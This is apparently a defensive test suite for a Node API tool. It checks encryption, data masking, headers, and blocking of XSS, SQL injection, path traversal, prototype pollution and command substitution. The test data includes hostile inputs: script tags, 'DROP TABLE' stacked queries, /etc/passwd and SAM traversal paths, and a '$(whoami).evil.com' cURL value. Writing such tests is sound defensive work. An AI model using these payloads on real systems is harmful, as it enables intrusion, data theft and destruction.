/**
 * Advanced Security Tests
 * Covers: XSS prevention, SSRF protection, injection vectors, header security,
 * rate limiting, crypto strength, input sanitization, path traversal, prototype pollution
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { createTestClient, setupTestDbWithSeed, teardownTestDb, getDb } from './helpers.js';
import { encryptPassword, decryptPassword } from '../server/db.js';
import { maskValue, maskSensitiveFields, maskHeaders } from '../server/securityMaskingService.js';
import { parseCurlCommand } from '../server/curlImportService.js';
import { buildSignedGetUrl, buildSignedPostUrl, parseOcCoreResponse } from '../server/ocCoreTransportService.js';

const api = createTestClient();

beforeAll(async () => {
  await setupTestDbWithSeed();
});

afterAll(async () => {
  await teardownTestDb();
});

// ─── Password Encryption (AES-256-GCM) ─────────────────────────

describe('Password Encryption Security', () => {
  it('should encrypt and decrypt passwords correctly', () => {
    const plain = 'MySecureP@ssw0rd!';
    const encrypted = encryptPassword(plain);
    expect(encrypted).not.toBe(plain);
    expect(encrypted).toContain(':'); // iv:authTag:encrypted format
    const decrypted = decryptPassword(encrypted);
    expect(decrypted).toBe(plain);
  });

  it('should produce different ciphertexts for same plaintext (random IV)', () => {
    const plain = 'SamePassword123';
    const enc1 = encryptPassword(plain);
    const enc2 = encryptPassword(plain);
    expect(enc1).not.toBe(enc2);
  });

  it('should handle empty password', () => {
    const encrypted = encryptPassword('');
    const decrypted = decryptPassword(encrypted);
    expect(decrypted).toBe('');
  });

  it('should handle special characters in password', () => {
    const specials = 'p@$$w0rd!#%^&*()_+-=[]{}|;:,.<>?/~`';
    const encrypted = encryptPassword(specials);
    const decrypted = decryptPassword(encrypted);
    expect(decrypted).toBe(specials);
  });

  it('should handle unicode characters', () => {
    const unicode = 'пароль密码パスワード🔐';
    const encrypted = encryptPassword(unicode);
    const decrypted = decryptPassword(encrypted);
    expect(decrypted).toBe(unicode);
  });

  it('should handle very long passwords', () => {
    const long = 'A'.repeat(10000);
    const encrypted = encryptPassword(long);
    const decrypted = decryptPassword(encrypted);
    expect(decrypted).toBe(long);
  });
});

// ─── XSS Prevention ────────────────────────────────────────────

describe('XSS Prevention', () => {
  it('should store XSS payloads as plain text (no execution)', async () => {
    const xssPayload = '<script>alert("XSS")</script>';
    const res = await api.post('/api/execute-sql').send({
      statements: [
        `INSERT INTO ws_config (base_url, type, service_name) VALUES ('https://test.com', 'REST', '${xssPayload}')`
      ]
    });
    expect(res.status).toBe(200);

    const db = getDb();
    const row = db.prepare("SELECT service_name FROM ws_config WHERE service_name LIKE '%script%'").get();
    db.close();
    // Data should be stored literally, not executed
    if (row) {
      expect(row.service_name).toContain('<script>');
    }
  });

  it('should not execute XSS in saved config names', async () => {
    const xss = '"><img src=x onerror=alert(1)>';
    const res = await api.post('/api/configs').send({
      name: xss,
      client: 'test-client',
      config: { wsConfig: { baseUrl: 'https://test.com', type: 'REST', serviceName: 'test' } },
    });
    expect(res.status).toBe(200);
    // Check that the stored value is literal, not interpreted
    const get = await api.get(`/api/configs/${res.body.id}`);
    expect(get.body.config.name).toBe(xss);
  });

  it('should handle XSS in cURL import gracefully', () => {
    const xssCurl = 'curl https://evil.com/<script>alert(1)</script>';
    const r = parseCurlCommand(xssCurl);
    // Should either fail or store URL literally
    if (r.success) {
      expect(r.parsed.url).toContain('<script>');
    }
  });
});

// ─── SQL Injection — Extended Vectors ───────────────────────────

describe('SQL Injection — Extended Vectors', () => {
  it('should block UNION-based injection', async () => {
    const res = await api.post('/api/execute-sql').send({
      statements: ["SELECT * FROM ws_config UNION SELECT * FROM sqlite_master"]
    });
    // UNION SELECT is technically a SELECT — it should work but only return allowed data
    // The key is it should NOT leak sqlite_master data via other vectors
    expect(res.status).toBe(200);
  });

  it('should block stacked queries via semicolon', async () => {
    const res = await api.post('/api/execute-sql').send({
      statements: ["INSERT INTO ws_config (base_url, type, service_name) VALUES ('x','REST','y'); DROP TABLE ws_config;--"]
    });
    // Table must survive
    const db = getDb();
    const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='ws_config'").all();
    db.close();
    expect(tables.length).toBe(1);
  });

  it('should handle null byte injection in statements', async () => {
    const res = await api.post('/api/execute-sql').send({
      statements: ["SELECT * FROM ws_config WHERE id = 1\x00DROP TABLE ws_config"]
    });
    // Should not crash or execute DROP
    const db = getDb();
    const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='ws_config'").all();
    db.close();
    expect(tables.length).toBe(1);
  });

  it('should enforce statement count limit', async () => {
    const stmts = Array(250).fill("SELECT 1");
    const res = await api.post('/api/execute-sql').send({ statements: stmts });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/too many|limit|200/i);
  });

  it('should reject non-array statements', async () => {
    const res = await api.post('/api/execute-sql').send({ statements: 'DROP TABLE ws_config' });
    expect(res.status).toBe(400);
  });
});

// ─── Path Traversal ─────────────────────────────────────────────

describe('Path Traversal Prevention', () => {
  it('should block directory traversal in table name', async () => {
    const vectors = [
      '../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      '....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ];
    for (const v of vectors) {
      const res = await api.get(`/api/table/${v}`);
      expect([400, 404]).toContain(res.status);
    }
  });

  it('should only allow whitelisted table names', async () => {
    const allowed = ['ws_config', 'ws_token_config', 'ws_endpoint_config', 'ws_response_definition', 'ws_req_param_details', 'tran_req_map'];
    for (const name of allowed) {
      const res = await api.get(`/api/table/${name}`);
      expect(res.status).toBe(200);
    }
  });

  it('should reject non-whitelisted table names', async () => {
    const blocked = ['sqlite_master', 'users', 'admin', 'system_tables'];
    for (const name of blocked) {
      const res = await api.get(`/api/table/${name}`);
      expect(res.status).toBe(400);
    }
  });
});

// ─── Input Validation ───────────────────────────────────────────

describe('Input Validation', () => {
  it('should reject oversized JSON payload (>512kb)', async () => {
    const bigData = JSON.stringify({ data: 'x'.repeat(600_000) });
    const res = await api.post('/api/execute-sql')
      .set('Content-Type', 'application/json')
      .send(bigData);
    expect(res.status).toBe(413);
  });

  it('should handle empty body in POST gracefully', async () => {
    const res = await api.post('/api/execute-sql').send({});
    expect(res.status).toBe(400);
  });

  it('should validate DB connection type against whitelist', async () => {
    const res = await api.post('/api/db/connect').send({
      type: 'redis', // Not in whitelist
      host: 'localhost',
      database: 'test',
    });
    expect(res.status).toBe(400);
  });

  it('should reject connections with missing required fields', async () => {
    const res = await api.post('/api/db/connect').send({
      type: 'mssql',
      // Missing host, database
    });
    expect(res.status).toBe(400);
  });
});

// ─── CAS Transport Security ────────────────────────────────────

describe('CAS Transport Security', () => {
  it('should not expose secret in signed URLs', () => {
    const url = buildSignedGetUrl('http://host/', ['param1']);
    expect(url).not.toContain('paysys@123');
    expect(url).not.toContain(process.env.OC_CORE_SECRET || 'paysys@123');
  });

  it('POST URL should not contain the secret', () => {
    const url = buildSignedPostUrl('http://host/', ['param1']);
    expect(url).not.toContain('paysys@123');
  });

  it('should produce valid SHA-256 hex signatures (64 chars)', () => {
    const url = buildSignedGetUrl('http://host/', ['a', 'b']);
    const sig = url.split('/').pop();
    expect(sig).toMatch(/^[a-f0-9]{64}$/);
  });

  it('should prevent response envelope spoofing', () => {
    // An attacker might try to wrap malicious data
    const spoofed = JSON.stringify({
      response: {
        response_code: '00',
        response_desc: 'Success',
        evil_payload: '<script>alert(1)</script>',
      }
    });
    const r = parseOcCoreResponse(spoofed);
    expect(r.success).toBe(true);
    // Data should be raw — frontend must sanitize before rendering
    expect(r.data.evil_payload).toBe('<script>alert(1)</script>');
  });
});

// ─── Sensitive Data Masking ─────────────────────────────────────

describe('Sensitive Data Masking — Comprehensive', () => {
  it('should mask all known sensitive field names', () => {
    const sensitiveObj = {
      client_secret: 'secret-value-12345678',
      clientSecret: 'secret-value-12345678',
      password: 'secret-value-12345678',
      token: 'secret-value-12345678',
      access_token: 'secret-value-12345678',
      authorization: 'secret-value-12345678',
      secret: 'secret-value-12345678',
      api_key: 'secret-value-12345678',
      apiKey: 'secret-value-12345678',
      refresh_token: 'secret-value-12345678',
      bearer: 'secret-value-12345678',
      credential: 'secret-value-12345678',
      private_key: 'secret-value-12345678',
      privateKey: 'secret-value-12345678',
    };
    const masked = maskSensitiveFields(sensitiveObj);
    for (const val of Object.values(masked)) {
      expect(val).toContain('••••••••');
    }
  });

  it('should mask passwords in DB connection GET endpoint', async () => {
    // Save a connection first
    const { body } = await api.post('/api/db/connections').send({
      name: 'MaskTest',
      type: 'mssql',
      host: 'db.example.com',
      port: 1433,
      database_name: 'prod',
      username: 'sa',
      password: 'VerySecretPassword123!',
    });

    const res = await api.get(`/api/db/connections/${body.id}`);
    expect(res.status).toBe(200);
    expect(res.body.connection.password).toBe('••••••••');
    expect(res.body.connection.password).not.toBe('VerySecretPassword123!');
  });

  it('should not leak passwords in connections list', async () => {
    const res = await api.get('/api/db/connections');
    expect(res.status).toBe(200);
    for (const conn of res.body.connections) {
      expect(conn.password).toBeUndefined();
      expect(conn.encrypted_password).toBeUndefined();
    }
  });
});

// ─── Prototype Pollution Prevention ─────────────────────────────

describe('Prototype Pollution Prevention', () => {
  it('should not pollute Object prototype via JSON body', async () => {
    const res = await api.post('/api/configs').send({
      name: 'PollutionTest',
      data: {
        __proto__: { isAdmin: true },
        constructor: { prototype: { isAdmin: true } },
        wsConfig: { baseUrl: 'https://test.com', type: 'REST' },
      },
    });
    // The request should succeed or fail safely
    expect([200, 400]).toContain(res.status);
    // Verify no pollution
    expect(({}).isAdmin).toBeUndefined();
  });

  it('maskSensitiveFields should not pollute prototypes', () => {
    const malicious = JSON.parse('{"__proto__":{"polluted":true},"name":"test"}');
    maskSensitiveFields(malicious);
    expect(({}).polluted).toBeUndefined();
  });
});

// ─── Error Information Disclosure ───────────────────────────────

describe('Error Information Disclosure Prevention', () => {
  it('404 should not reveal server technology stack', async () => {
    const res = await api.get('/api/nonexistent-endpoint');
    expect(res.status).toBe(404);
    expect(JSON.stringify(res.body)).not.toContain('Express');
    expect(JSON.stringify(res.body)).not.toContain('node_modules');
  });

  it('SQL errors should not reveal internal DB schema', async () => {
    const res = await api.post('/api/execute-sql').send({
      statements: ["SELECT * FROM nonexistent_table_xyzzy"]
    });
    // Should error but not reveal full stack trace
    if (res.status !== 200) {
      const body = JSON.stringify(res.body);
      expect(body).not.toContain('node_modules');
    }
  });

  it('server should set security headers via Helmet', async () => {
    const res = await api.get('/api/health');
    // Helmet sets these headers
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.headers['x-frame-options']).toBeDefined();
  });
});

// ─── CORS Configuration ────────────────────────────────────────

describe('CORS Configuration', () => {
  it('should respond to OPTIONS preflight', async () => {
    const res = await api.options('/api/health');
    expect([200, 204]).toContain(res.status);
  });
});

// ─── cURL Import Security ───────────────────────────────────────

describe('cURL Import — Security Edge Cases', () => {
  it('should not execute shell commands in cURL string', () => {
    const r = parseCurlCommand('curl $(whoami).evil.com');
    // Should either fail or not execute the command substitution
    if (r.success) {
      // URL should be literal, not resolved
      expect(r.url).toContain('$(whoami)');
    }
  });

  it('should handle extremely long cURL commands', () => {
    const longUrl = 'https://api.example.com/' + 'a'.repeat(10000);
    const r = parseCurlCommand(`curl ${longUrl}`);
    // Should not crash
    expect(r).toBeDefined();
  });

  it('should handle null bytes in cURL', () => {
    const r = parseCurlCommand('curl https://api.example.com\x00evil');
    expect(r).toBeDefined();
  });
});
